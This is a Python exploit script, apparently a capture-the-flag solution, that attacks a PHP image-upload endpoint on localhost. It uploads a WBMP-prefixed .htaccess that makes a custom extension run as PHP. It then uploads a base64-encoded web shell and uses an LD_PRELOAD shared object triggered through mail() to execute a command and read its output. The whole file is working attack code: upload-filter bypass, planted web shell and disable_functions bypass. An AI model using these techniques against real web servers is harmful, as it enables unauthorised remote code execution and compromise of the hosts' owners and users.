#!/usr/bin/python3
import requests
import base64

VALID_WBMP = b"\x00\x00\x8a\x39\x8a\x39\x0a"
URL = "http://127.0.0.1:3095/"
RANDOM_DIRECTORY = "cfc6740b07428eaafb3843c4fe972ffe59b71ccd"

COOKIES = {
    "PHPSESSID" : "rg9i3jblhotrru4bog49cclii6"
}
def upload_content(name, content):

    data = {
        "image" : (name, content, 'image/png'),
        "upload" : (None, "Submit Query", None)
    }

    response = requests.post(URL, files=data, cookies=COOKIES)

HT_ACCESS = VALID_WBMP + b"""
AddType application/x-httpd-php .tiaonmmn
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.tiaonmmn"
"""
TARGET_FILE = VALID_WBMP + b"AA" + base64.b64encode(b"""
<?php
move_uploaded_file($_FILES['evil']['tmp_name'], '/tmp/evil.so');
putenv('LD_PRELOAD=/tmp/evil.so');
putenv("_evilcmd=/get_flag");
mail('a','a','a');
echo file_get_contents('/tmp/_0utput.txt');
?>
""")

upload_content("..htaccess", HT_ACCESS)
upload_content("shell.tiaonmmn", TARGET_FILE)
upload_content("trigger.tiaonmmn", VALID_WBMP)


files = { "evil" : open("./evil.so", "rb") }
response = requests.post(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.tiaonmmn", files=files)
print(response.text)
